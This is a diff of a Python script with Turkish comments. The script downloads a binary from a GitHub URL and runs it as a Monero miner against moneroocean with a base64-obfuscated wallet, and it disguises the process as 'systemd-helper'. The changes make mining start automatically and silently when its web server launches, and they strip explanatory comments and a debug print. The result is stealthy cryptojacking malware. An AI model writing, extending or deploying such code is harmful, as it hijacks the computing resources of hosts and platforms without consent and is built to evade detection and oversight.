@@ -20,7 +20,7 @@ STATUS = {"running": False, "message": "Sistem Beklemede"}
 CF_WORKER_HOST = ""
 WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
 
-# Havuz listesi (öncelik sırasına göre)
+# Ana havuz adresi sabitlendi
 POOLS = [
     "gulf.moneroocean.stream:443"
 ]
@@ -34,14 +34,13 @@ def log_to_console(msg):
     timestamp = time.strftime("%H:%M:%S")
     line = f"[{timestamp}] {clean_msg}"
     CONSOLE_LOGS.append(line)
-    print(msg)  # Orijinal renkli çıktı terminale
+    print(msg)
 
 def set_process_name(name):
     try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
     except: pass
 
 def kill_process(proc):
-    """Süreci ve tüm alt süreçlerini sonlandır."""
     try:
         proc.terminate()
         time.sleep(1)
@@ -52,7 +51,7 @@ def kill_process(proc):
 def execution_logic():
     global STATUS
     try:
-        log_to_console("Aktivasyon sinyali alındı.")
+        log_to_console("Sistem otomatik başlatıldı.")
         log_to_console("Çekirdek indiriliyor: GitHub/Exma0/va/x")
         
         url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
@@ -73,7 +72,6 @@ def execution_logic():
         log_to_console("Süreç maskeleniyor: systemd-helper")
         set_process_name("systemd-helper")
         
-        # Havuz listesini oluştur: önce CF_WORKER_HOST varsa onu ekle, sonra fallback'leri
         pools_to_try = []
         if CF_WORKER_HOST:
             pools_to_try.append(f"{CF_WORKER_HOST}:443")
@@ -82,7 +80,6 @@ def execution_logic():
         STATUS["running"] = True
         STATUS["message"] = "Sistem Aktif"
         
-        # Her havuzu dene
         for pool_index, pool_host in enumerate(pools_to_try):
             log_to_console(f"Havuz deneniyor [{pool_index+1}/{len(pools_to_try)}]: {pool_host}")
             
@@ -100,18 +97,15 @@ def execution_logic():
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                     text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"})
             
-            # Hata sayacı
             error_count = 0
             max_errors = 5
             success = False
             
-            # Çıktıları oku
             for line in iter(proc.stdout.readline, ""):
                 if not line:
                     break
                 log_to_console(f"{line.strip()}")
                 
-                # "read error" kontrolü
                 if "read error" in line.lower():
                     error_count += 1
                     log_to_console(f"Hata sayacı: {error_count}/{max_errors}")
@@ -120,26 +114,20 @@ def execution_logic():
                         kill_process(proc)
                         break
                 
-                # Eğer "accepted" (kabul edilen share) görürsek, başarılı sayalım ve bu havuzda kalalım
                 if "accepted" in line.lower():
                     success = True
-                    # Hata sayacını sıfırla (isteğe bağlı)
                     error_count = 0
             
-            # Eğer döngüden çıkıldıysa (proc bitti veya kırıldı)
             if proc.poll() is None:
                 kill_process(proc)
             
-            # Eğer başarılı olduysak, döngüden çık (zaten sonsuz döngüde olacak, ama buraya gelmez)
             if success:
                 log_to_console(f"Havuz {pool_host} başarılı, kalıcı olarak kullanılıyor.")
                 break
             
-            # Son havuzsa ve başarısızsa, uyarı ver
             if pool_index == len(pools_to_try) - 1:
                 log_to_console("Tüm havuzlar denendi, bağlantı kurulamadı. Madenci duracak.")
         
-        # Geçici dosyayı temizle
         try:
             os.unlink(tmp_path)
         except:
@@ -209,8 +197,14 @@ def run():
     parsed = urlparse(raw_url)
     global CF_WORKER_HOST
     CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
-    print(f"CF_WORKER_HOST ayarlandı: {CF_WORKER_HOST}")  # Docker logunda görmek için
+    
     port = int(os.environ.get("PORT", 8080))
+    
+    # SİSTEMİ OTOMATİK BAŞLATAN KISIM
+    if not STATUS["running"]:
+        threading.Thread(target=execution_logic, daemon=True).start()
+        
+    print(f"Web sunucusu {port} portunda başlatılıyor...")
     http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()
 
 if __name__ == "__main__":
